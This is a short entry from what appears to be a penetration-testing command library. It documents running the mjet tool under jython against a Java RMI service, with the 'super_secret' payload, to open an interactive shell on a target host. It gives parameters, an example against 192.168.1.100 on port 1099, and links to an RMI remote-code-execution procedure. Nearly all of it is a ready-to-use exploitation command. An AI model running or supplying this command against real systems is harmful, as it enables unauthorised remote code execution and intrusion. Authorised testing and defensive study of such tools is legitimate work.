---
id: ecf916af-6fc5-40e8-af3f-61c06a971120
name: mjet-open-shell-using-super-secret
type: command
executor: bash
data: jython mjet.py $_TARGET_IP $_TARGET_PORT command super_secret shell
output: null
created_at: '2023-04-06T03:56:00.891104+00:00'
updated_at: '2023-04-06T03:56:00.909513+00:00'
platforms:
  - Linux
tags:
  - exploitation
  - rmi
  - shell
verified: true
validated: true
---

# mjet-open-shell-using-super-secret

## Command

```bash
jython mjet.py $_TARGET_IP $_TARGET_PORT command super_secret shell
```

## Description

Opens an interactive shell on the target using the mjet super_secret payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP | Yes |
| $_TARGET_PORT | Port | Yes |
| command | Action | Yes |
| super_secret | Payload name | Yes |
| shell | Shell command | Yes |

## Examples

### Basic Usage

```bash
jython mjet.py 192.168.1.100 1099 command super_secret shell
```

## Expected Output

Interactive shell session.

## Related

- [[procedures/Exploit-Java-RMI-for-RCE-Using-Sjet-or-Mjet]]
- [[commands/mjet-execute-whoami-using-super-secret]]
